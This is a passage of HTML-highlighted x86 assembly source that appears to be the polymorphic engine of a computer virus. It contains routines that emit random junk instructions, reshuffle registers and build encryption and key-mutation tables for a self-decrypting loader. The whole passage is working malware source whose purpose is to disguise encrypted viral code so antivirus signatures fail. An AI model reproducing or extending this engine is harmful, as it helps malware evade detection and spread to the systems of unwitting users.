        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">; base</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">         </span><span class="sc1">; suff</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_register</span><span class="sc0">    </span><span class="sc1">; dest</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; save temp in ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0">      </span><span class="sc1">; all regs</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; reg in ECX and restore EAX</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_dimension</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">make_jmp_after_cmp</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">rotating_imms</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0110b</span><span class="sc0">                </span><span class="sc1">; 0f0 doesn't exist</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">rotating_imms</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; *8</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_register</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c1h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_dimension</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">put_immediates</span><span class="sc0">

</span><span class="sc5">notneg_register</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0d0f7h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">not_add</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
</span><span class="sc5">not_add</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_register</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc1">;        jmp     g_dimension</span><span class="sc0">

</span><span class="sc5">g_dimension</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; EDI after generated garb</span><span class="sc0">
</span><span class="sc5">reget_dim</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">010b</span><span class="sc0">        </span><span class="sc1">; 0 or 2</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_change</span><span class="sc0">
</span><span class="sc5">word_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">66h</span><span class="sc0">    </span><span class="sc1">; the prefix</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">no_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; in ECX needed immediates</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">imm_assign</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">         </span><span class="sc1">; base</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_dimension</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc1">;        jmp     put_immediates</span><span class="sc0">

</span><span class="sc5">put_immediates</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; cl how many</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
</span><span class="sc5">put_imm_part</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">put_imm_part</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">inc_dec_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01b</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; * 8, so will be 0 or 8</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; incdec generation</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_register</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_dimension</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">xchg_regs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0c087h</span><span class="sc0">               </span><span class="sc1">; xchg eax,eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_register</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_register</span><span class="sc0">
</span><span class="sc5">common_test_xchg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">g_dimension</span><span class="sc0">

</span><span class="sc5">test_regs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0c085h</span><span class="sc0">               </span><span class="sc1">; test eax,eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">common_test_xchg</span><span class="sc0">

</span><span class="sc5">temp_save_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                    </span><span class="sc1">; 1/4 probability, since this couldn't</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">skip_changer</span><span class="sc0">            </span><span class="sc1">; come too often</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">select_save</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">skip_changer</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">save_mov_xchg</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; in al new register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; imp_reg</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">; mov important_reg,some_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r_used</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">    </span><span class="sc1">; restore regs status</span><span class="sc0">
</span><span class="sc5">skip_changer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">select_save</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">; get from 0 to 2</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">select_save</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_pointer</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">                 </span><span class="sc1">; not already assigned?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_bad</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                  </span><span class="sc1">; no key signature, if so skip</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_bad</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">is_used</span><span class="sc0">                 </span><span class="sc1">; maybe is already saved on stack or</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">return_good</span><span class="sc0">             </span><span class="sc1">; such?</span><span class="sc0">
</span><span class="sc5">exit_bad</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">return_good</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r_used</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">save_mov_xchg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_register</span><span class="sc0">            </span><span class="sc1">; get an usable register</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_used</span><span class="sc0">                </span><span class="sc1">; set this one as used</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">unset_used</span><span class="sc0">              </span><span class="sc1">; and the previous as unused</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">087h</span><span class="sc0">                 </span><span class="sc1">; xchg reg,reg base</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">              </span><span class="sc1">; select if using mov or xchg</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">use_mov_first</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; + 4 becames mov reg,reg base</span><span class="sc0">
</span><span class="sc5">use_mov_first</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; when just saving this won't be used</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">use_mov_after</span><span class="sc0">           </span><span class="sc1">; select whichone for restore aswell</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">use_mov_after</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                   </span><span class="sc1">; restore one</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; * 8</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">                 </span><span class="sc1">; mov some_reg,important_reg</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">; put the moving of regs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; tables for various purposes</span><span class="sc0">
</span><span class="sc5">garbage_offsets</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">call_subroutines</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">gen_one_byters</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">mov_registers</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">mem_assign</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">mem_mathops</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">maths_immediate</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">maths_immediate_short</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">maths_registers</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">rotating_imms</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">notneg_register</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">imm_assign</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">inc_dec_reg</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">xchg_regs</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">test_regs</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">temp_save_change</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">cdq_jmps_savestack</span><span class="sc0">


</span><span class="sc5">one_byters</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">0fch</span><span class="sc4">,</span><span class="sc2">0fdh</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc2">0f9h</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc0">

</span><span class="sc5">change_jump</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">098h</span><span class="sc4">,</span><span class="sc2">099h</span><span class="sc4">,</span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">

</span><span class="sc5">_math_imm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">008c1h</span><span class="sc0">  </span><span class="sc1">; ror d[ebx],imm</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">02881h</span><span class="sc0">  </span><span class="sc1">; sub d[ebx],imm</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">03081h</span><span class="sc0">  </span><span class="sc1">; xor d[ebx],imm</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00081h</span><span class="sc0">  </span><span class="sc1">; add d[ebx],imm</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">000c1h</span><span class="sc0">  </span><span class="sc1">; rol d[ebx],imm</span><span class="sc0">
</span><span class="sc5">_math_key</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">008d3h</span><span class="sc0">  </span><span class="sc1">; ror d[ebx],cl</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00029h</span><span class="sc0">  </span><span class="sc1">; sub d[ebx],eax</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00031h</span><span class="sc0">  </span><span class="sc1">; xor d[ebx],eax</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00001h</span><span class="sc0">  </span><span class="sc1">; add d[ebx],eax</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">000d3h</span><span class="sc0">  </span><span class="sc1">; rol d[ebx],cl</span><span class="sc0">

</span><span class="sc1">; cmp,or,xor,sub,add</span><span class="sc0">
</span><span class="sc5">chk_counter</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc2">0c8h</span><span class="sc0">
</span><span class="sc5">key_changers</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e8h</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">  </span><span class="sc1">; xor sub add</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">0c8h</span><span class="sc0">       </span><span class="sc1">; ror rol</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc0">       </span><span class="sc1">; inc dec</span><span class="sc0">

</span><span class="sc5">get_address</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_runnin</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_runnin</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_inipnt</span><span class="sc4">)]</span><span class="sc0">
                                                </span><span class="sc1">; actual decryptor lenght</span><span class="sc0">
